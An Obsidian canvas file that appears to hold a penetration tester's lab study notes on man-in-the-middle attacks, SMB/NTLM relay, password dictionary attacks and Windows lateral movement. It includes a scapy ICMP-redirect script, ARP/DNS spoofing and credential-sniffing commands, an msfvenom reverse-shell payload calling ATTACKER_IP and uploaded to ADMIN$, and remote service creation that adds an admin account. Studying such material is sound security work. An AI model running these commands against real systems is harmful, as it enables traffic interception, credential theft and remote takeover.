{
	"nodes":[
		{"id":"d31e6e1b604800ec","type":"file","file":"NOTES/99. TOOLS/cewl/cewl.md","x":-4349,"y":-1300,"width":648,"height":263},
		{"id":"941f61d00a5fe98c","type":"text","text":"# IP masquerading\n```\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE\n```","x":-989,"y":-620,"width":860,"height":180},
		{"id":"3467716f63cf018b","type":"text","text":"# Create an ICMP redirect script\nLaunch **scapy** and copy-paste the script content in **scapy** to launch the attack.\n\n```bash\n$ scapy\n...\noriginalRouterIP='10.100.13.1'\nattackerIP='10.100.13.20'\nvictimIP='10.100.13.126'\nserverIP='10.23.56.100'\n# We create an ICMP Redirect packet\nip=IP()\nip.src=originalRouterIP\nip.dst=victimIP\nicmpRedirect=ICMP()\nicmpRedirect.type=5\nicmpRedirect.code=1\nicmpRedirect.gw=attackerIP\n# The ICMP packet payload /should/ contain the original TCP SYN packet\n# sent from the victimIP\nredirPayloadIP=IP()\nredirPayloadIP.src=victimIP\nredirPayloadIP.dst=serverIP\nfakeOriginalTCPSYN=TCP()\nfakeOriginalTCPSYN.flags=\"S\"\nfakeOriginalTCPSYN.dport=80\nfakeOriginalTCPSYN.seq=444444444\nfakeOriginalTCPSYN.sport=55555\nwhile True:\n    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)\n```","x":-1085,"y":-1400,"width":1060,"height":600},
		{"id":"bd47b2f5fe05ed21","type":"text","text":"![[LM_NTLM_NTLMv2#SMB Relay Attack on NTLMv1/NTLMv2]]","x":-4040,"y":-102,"width":1240,"height":1922},
		{"id":"079b010d2ddec0b0","type":"text","text":"![[LM_NTLM_NTLMv2#Server impersonation - Capture the client response (Type 3 message) in LM, NTLMv1 authentication protocols.]]","x":-5300,"y":-102,"width":1260,"height":1862},
		{"id":"ec744eb6e636f2ad","type":"text","text":"# (OSI/ISO 2 Layer - Data Link)","x":-191,"y":359,"width":543,"height":60,"color":"2"},
		{"id":"818c9f6aef87c70d","type":"text","text":" SMB relay attack focuses on relaying SMB traffic, which is a broader concept, while an NTLM relay attack specifically targets the NTLM authentication process within the SMB protocol.","x":-2519,"y":1034,"width":578,"height":141,"color":"5"},
		{"id":"df93168a3d16a910","type":"text","text":"# NTLM Relay Attack","x":-2369,"y":1468,"width":419,"height":60,"color":"1"},
		{"id":"a0e038b2338d85b0","type":"text","text":"# SMB Relay Attack","x":-2160,"y":238,"width":358,"height":60,"color":"1"},
		{"id":"2c75577749f6adb5","type":"text","text":"Allow the attacker to re-use authentication attempts in order to gain access to a system in the network\n\n* Attack works only if the **user**, who is trying to authenticate on the target machine,** has administrative privileges on the target**.\n* Attack will only work if the target machines has the \"**Network security: LAN Manager authentication level\" set to \"Send LM & NTLM responses\"**.\n* **SMB Signing** should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.\n\nTo defend against SMB relay attacks, organizations can use security mechanisms like SMB signing, which adds a digital signature to SMB packets, making them harder to tamper with.\n\nPrerequisits:\n- NetBIOS Name Service and Link Local Multicast Name Resolution are used in network\n- SMB signing is disabled/enabled but not enforced","x":-1941,"y":298,"width":500,"height":642},
		{"id":"c50e64cd9b423ed0","type":"text","text":"## $ arpspoof (ARP spoof)\n**arpspoof** redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.  \nhttps://www.geeksforgeeks.org/ssl-stripping-and-arp-spoofing-in-kali-linux/\n```bash\n$ arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host\n\n# Turn on the packet forwarding in Linux\n# By enabling the packet forwarding, you disguise your local machine to act as the network router.\n$ sysctl -w net.ipv4.ip_forward=1\n$ echo '1' > /proc/sys/net/ipv4/ip_forward # enable packet forwarding, IP forwarding\n\n$ arpspoof [-i <Network_Interface_Name>] [-t <target_IP>] [-r <impersonated_IP>] # ARP spoofing / MitM attack (remeber to turn on IP forwarding)\n\n# Stopping the attack\n# kill arpspoof proceses and\n# Turn off the packet forwarding in Linux\n$ sysctl -w net.ipv4.ip_forward=0\n$ echo '0' > /proc/sys/net/ipv4/ip_forward # disable packet forwarding, IP forwarding\n```\n","x":60,"y":1098,"width":1085,"height":502},
		{"id":"9d539e36cd67c5dc","type":"text","text":"## $ bettercap (spoof + sniff)\n```bash\n$ bettercap [-I eth0] # default spoofing attack against all hosts\n$ bettercap [-I eth0] --no-spoofing # discovery devices in network, network sniffing, Mitm attack \n$ bettercap [-I eth0] -T <target_IP> # ARP spoofing attack against host, MitM attack\n$ bettercap [-I eth0] -X  -T <target_IP> -G <gateway_IP># default spoofing attack against all hosts with sniffing, Mitm attack\n```\n\n## $ ettercap (spoof + sniff)\n\n```bash\n$ ettercap -G # run ettercap, graphic mode\n$ ettercap -T -M [-i eth0] [-L </tmp/logfile>] <IP1> [<IP2>] # MitM attack and sniff connection\n```\n","x":135,"y":594,"width":1085,"height":366},
		{"id":"045f441a3dea057e","type":"text","text":"# Wordlist generators","x":-3872,"y":-838,"width":376,"height":117},
		{"id":"6d36d6896a43ba9a","type":"text","text":"# $ mentalist\nhttps://github.com/sc0tfree/mentalist\ngraphical tool for custom wordlist generation","x":-4903,"y":-1591,"width":467,"height":246},
		{"id":"ea40abf07ea9405f","type":"text","text":"# $ rsmangler\n```bash\n$ cat wordls.txt\n\trobot\n\tLLC\n\tIndustries\n$ cat words.txt | rsmangler --file - > words_new.txt\n```","x":-3836,"y":-1591,"width":681,"height":262},
		{"id":"43e8f4b2e8280262","type":"text","text":"# Man in the Middle","x":-1691,"y":-40,"width":513,"height":120,"color":"1"},
		{"id":"26957af29410c064","type":"text","text":"In this type of an attack, the hacker, posing as a router, sends an Internet Control Message Protocol (ICMP) redirect message to a host, which **indicates that all future traffic must be directed to a specific system as the more optimal route for the destination**.","x":-1941,"y":-474,"width":627,"height":150},
		{"id":"e5e267f1a2607c99","type":"text","text":"# ICMP Redirect Attack","x":-1514,"y":-333,"width":429,"height":110,"color":"1"},
		{"id":"606b2f30486cd716","type":"text","text":"attack in which the attacker secretly intercepts and relays messages between two parties","x":-1627,"y":140,"width":459,"height":96},
		{"id":"5ddf9942d689a264","type":"text","text":"# DNS Spoof","x":-989,"y":268,"width":358,"height":60,"color":"1"},
		{"id":"a4f2950e922368f4","type":"text","text":"# $ dnsspoof\nDrops DNS responses before they hit the router then replaces them with the spoofed DNS response.\n\n\n\n```bash\n# use in conjunction with `$ arp-spoof`\n$ echo \"172.16.5.101 *.sportsfoo.com\" > dns\n$ dnsspoof -i eth1 -f dns\n```\nhttps://my.ine.com/INE/courses/26e04354-3a80-454c-9b97-10a71071bb79/penetration-testing-network-security/lab/aaac6401-58a8-4f3c-b7f9-3f2a4fedda23\n\n","x":-1008,"y":419,"width":500,"height":421},
		{"id":"981fd982fe75cf98","type":"text","text":"#  (OSI/ISO 3 Layer - Network)","x":-1284,"y":1240,"width":526,"height":109,"color":"2"},
		{"id":"8f4a37fde6ed251a","type":"text","text":"# $ tcpdump\n```bash\n$ tcpdump\n```","x":352,"y":-333,"width":325,"height":150},
		{"id":"43d92380d74517f2","type":"text","text":"# Sniffing","x":-441,"y":-258,"width":250,"height":70,"color":"1"},
		{"id":"08d42d1c5608a4ea","type":"text","text":"# $ p0f\n```bash\n$ p0f -i <interface> # passive OS detection\n```","x":60,"y":-120,"width":520,"height":160},
		{"id":"2cab20fba228e1fe","type":"text","text":"# driftnet\nWhen MitM (`$ apr-spoof...`) attack is running it sniffs for images, etc. \n```bash\n$ driftnet -i eth1\n```","x":-764,"y":1544,"width":600,"height":240},
		{"id":"4ab77513f7caac80","type":"text","text":"# $ Cain&Abel\nGraphical tool for windows.","x":-758,"y":1806,"width":358,"height":120},
		{"id":"11c64446576e039f","type":"text","text":"# $ dsniff (password sniff)\nWhen MitM (`$ apr-spoof...`) attack is running it sniffs for creds, etc. \n```bash\n$ dsniff -i <interface> \n```\n","x":-758,"y":1979,"width":666,"height":187},
		{"id":"23ac073d993d561a","type":"text","text":"## $ msf - arp_poisoning (ARP spoof)\n```bash\nmsf> auxiliary/spoof/arp/arp_poisoning\nset DHOSTS *IP address of the attacked system*\nset SHOSTS *IP address of the gateway*\n```\n","x":60,"y":1626,"width":1085,"height":240},
		{"id":"f894cd21b36f59f6","type":"text","text":"# Capture creds from HTPP POST request and ftp \n```bash\n# copy bettercap modules to workingdirectory\ncp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/ftp.rb . \ncp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/post.rb .\n\n$ bettercap -X -I eth0 -T <IP1>,<IP2> -P post,ftp # launch bettercap in sniffer mode\n...\n```","x":1360,"y":648,"width":744,"height":258},
		{"id":"67cf75a3bc300117","type":"text","text":"# dictionary attacks","x":-3027,"y":-791,"width":387,"height":111},
		{"id":"03985552d7697116","type":"text","text":"# $ medusa","x":-2508,"y":-1037,"width":250,"height":60},
		{"id":"dacf7e22c12bd102","type":"text","text":"# $ hydra","x":-2567,"y":-1196,"width":309,"height":116},
		{"id":"817501f55fc904f9","type":"text","text":"# $ ncrack\nhttps://github.com/nmap/ncrack\nNOT MAINTAINED, MOST OF IT FEATURES CONVERTED TO NMAP SCRIPTS (BRUTE CATEGORY)","x":-2579,"y":-954,"width":360,"height":233},
		{"id":"210a8ca127411188","type":"text","text":"# Dictionary attacks","x":-3320,"y":-515,"width":448,"height":116,"color":"1"},
		{"id":"0d718724e1aa6c12","type":"text","text":"# $ netexec\n```bash\n$ nxc smb ./hosts -u pete -p Nexus123!\n```","x":-2714,"y":-1468,"width":456,"height":205},
		{"id":"af2f77f6993c3472","type":"file","file":"NOTES/99. TOOLS/Responder/responder (NTLM relay attack).md","x":-2340,"y":1798,"width":915,"height":736},
		{"id":"6974352c8e42268e","type":"text","text":"```bash\n# create service executable\n# service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately.\nmsfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe\n\nsmbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever # upload payload to the ADMIN$\n```","x":1880,"y":-2386,"width":1560,"height":220},
		{"id":"457cbd4483bdbef8","type":"text","text":"# Creating Scheduled Tasks Remotely\nRemote command/payload execution by registering a scheduled task on a host.\nSystem will run the scheduled task, the command's output won't be available to us, making this a blind attack.\n\n```powershell\n\n# create a task named THMtask1\nschtasks /s target-ip /RU \"SYSTEM\" /create /tn \"MyTask\" /tr \"powershell -command 'Get-ComputerInfo'\" /sc ONCE /sd 01/01/1970 /st 00:00 \n\n# run the task\nschtasks /s target-ip /run /tn \"MyTask\"\n\n# Delete the task\nschtasks /s target-ip /tn \"MyTask\" /DELETE /F\n\n# schedule type (/sc) ONCE - task is intended to be run only once at the specified time and date. \n# starting date (/sd)\n# starting time (/st)\n```","x":1954,"y":-3026,"width":1140,"height":520},
		{"id":"5b6d8fb2c927f00b","type":"text","text":"# Remotely Creating Services Using sc.exe (Service Control)\n\n- **Ports:**\n    - 135/TCP, 49152-65535/TCP (DCE/RPC)\n    - 139/TCP (RPC over SMB Named Pipes)\n    - 445/TCP (RPC over SMB Named Pipes)\n- **Required Group Memberships:** Administrators\n\nRemote command execution by registering and running services on a host. The service is configured to run a command at start up.\n\nWindows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.\n\nWhen using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:\n```powershell\n# Register the dummy service \ncmd> sc.exe \\\\target-ip create FakeService binpath= \"net user adm1n p@ssword123! /add\" start= auto\ncmd> sc.exe \\\\target-ip start FakeService # Start the remote service to run the command\n\n# Stop and delete the service\nsc.exe \\\\target-ip stop FakeService\nsc.exe \\\\target-ip delete FakeService\n```\n```mermaid\nsequenceDiagram\n    participant Attacker\n    participant Target\n\nNote over Attacker, Target: Try to authenticate to the Service Control Manager via RPC first.\n\tNote over Attacker:  Talk with  Endpoint Mapper (EPM)\n    Attacker -) Target: 1. RPC request for SVCCTL\n    Target -) Attacker: 2. RPC response with SVCCTL port (usually a high number port)\n    Note over Attacker: Talk with SVCCTL\n    Attacker -) Target: 3. RPC bind to SVCCTL port\n\nNote over Attacker, Target: If RPC fails, attempt to communicate via a SMB named pipe.\n\tAttacker -) Target: 1. Attempt bind to \\pipe\\svcctl\n\n```\n\n","x":3167,"y":-3587,"width":1140,"height":761},
		{"id":"af1a68a117bbef71","type":"text","text":"# Spawning Processes ","x":2350,"y":-3626,"width":621,"height":160}
	],
	"edges":[
		{"id":"09ef996c716a3105","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"43d92380d74517f2","toSide":"left"},
		{"id":"eec5229297e8fe8b","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"ec744eb6e636f2ad","toSide":"top"},
		{"id":"9c941e1e0e6931ce","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"9d539e36cd67c5dc","toSide":"top"},
		{"id":"b6606681e17e80bc","fromNode":"43d92380d74517f2","fromSide":"right","toNode":"08d42d1c5608a4ea","toSide":"top"},
		{"id":"51af2e00f342b22f","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"981fd982fe75cf98","toSide":"top"},
		{"id":"93ef1f3cfa0e3957","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"11c64446576e039f","toSide":"left"},
		{"id":"fcdb5facda76e850","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"4ab77513f7caac80","toSide":"left"},
		{"id":"592c50c6c39776c2","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"2cab20fba228e1fe","toSide":"left"},
		{"id":"6e987eaf9ece3cc1","fromNode":"981fd982fe75cf98","fromSide":"left","toNode":"af2f77f6993c3472","toSide":"right"},
		{"id":"b0a409d190d8a619","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"981fd982fe75cf98","toSide":"top"},
		{"id":"bcc6b24188a3ede0","fromNode":"e5e267f1a2607c99","fromSide":"top","toNode":"941f61d00a5fe98c","toSide":"bottom"},
		{"id":"d7db991d1aff38b6","fromNode":"941f61d00a5fe98c","fromSide":"top","toNode":"3467716f63cf018b","toSide":"bottom"},
		{"id":"0f75eda25abf26e5","fromNode":"43e8f4b2e8280262","fromSide":"top","toNode":"e5e267f1a2607c99","toSide":"bottom"},
		{"id":"1bda106e17588645","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"dacf7e22c12bd102","toSide":"left"},
		{"id":"0c737c74f1f21111","fromNode":"210a8ca127411188","fromSide":"left","toNode":"045f441a3dea057e","toSide":"right"},
		{"id":"0fd2037907a482b5","fromNode":"045f441a3dea057e","fromSide":"top","toNode":"ea40abf07ea9405f","toSide":"bottom"},
		{"id":"d12eeb13e36bef82","fromNode":"045f441a3dea057e","fromSide":"top","toNode":"d31e6e1b604800ec","toSide":"bottom"},
		{"id":"ae03d8b3744bb8cc","fromNode":"210a8ca127411188","fromSide":"top","toNode":"67cf75a3bc300117","toSide":"bottom"},
		{"id":"fd676a2962b1d5fa","fromNode":"d31e6e1b604800ec","fromSide":"right","toNode":"ea40abf07ea9405f","toSide":"bottom"},
		{"id":"ed9ff034ea329291","fromNode":"d31e6e1b604800ec","fromSide":"top","toNode":"6d36d6896a43ba9a","toSide":"bottom"},
		{"id":"06249943e789d6d4","fromNode":"045f441a3dea057e","fromSide":"left","toNode":"6d36d6896a43ba9a","toSide":"bottom"},
		{"id":"f281432268e8586e","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"817501f55fc904f9","toSide":"left"},
		{"id":"8615219be37b4039","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"03985552d7697116","toSide":"left"},
		{"id":"884f9558c525998a","fromNode":"a0e038b2338d85b0","fromSide":"right","toNode":"43e8f4b2e8280262","toSide":"left"},
		{"id":"01785c068e4d3083","fromNode":"a0e038b2338d85b0","fromSide":"left","toNode":"bd47b2f5fe05ed21","toSide":"right"},
		{"id":"6cd9b92fb3a2a760","fromNode":"df93168a3d16a910","fromSide":"bottom","toNode":"af2f77f6993c3472","toSide":"top"},
		{"id":"1d65626c1d354f28","fromNode":"a0e038b2338d85b0","fromSide":"bottom","toNode":"818c9f6aef87c70d","toSide":"top"},
		{"id":"9ced5a9550747f52","fromNode":"df93168a3d16a910","fromSide":"top","toNode":"818c9f6aef87c70d","toSide":"bottom"},
		{"id":"1d60fcf7ee1f24ce","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"5ddf9942d689a264","toSide":"top"},
		{"id":"1f2fbbe01a4aa9e0","fromNode":"5ddf9942d689a264","fromSide":"bottom","toNode":"a4f2950e922368f4","toSide":"top"},
		{"id":"dc7896ee933d44c8","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"c50e64cd9b423ed0","toSide":"left"},
		{"id":"324fedf2fe1069f6","fromNode":"43d92380d74517f2","fromSide":"right","toNode":"8f4a37fde6ed251a","toSide":"top"},
		{"id":"d662607dee70fef1","fromNode":"9d539e36cd67c5dc","fromSide":"right","toNode":"f894cd21b36f59f6","toSide":"left"},
		{"id":"8d3ab3981318592b","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"0d718724e1aa6c12","toSide":"left"},
		{"id":"fd4221b0c3aea201","fromNode":"457cbd4483bdbef8","fromSide":"bottom","toNode":"6974352c8e42268e","toSide":"top"},
		{"id":"7df7403503a4fe01","fromNode":"af1a68a117bbef71","fromSide":"bottom","toNode":"457cbd4483bdbef8","toSide":"top"},
		{"id":"4794fda07cd386b9","fromNode":"af1a68a117bbef71","fromSide":"bottom","toNode":"5b6d8fb2c927f00b","toSide":"left"}
	]
}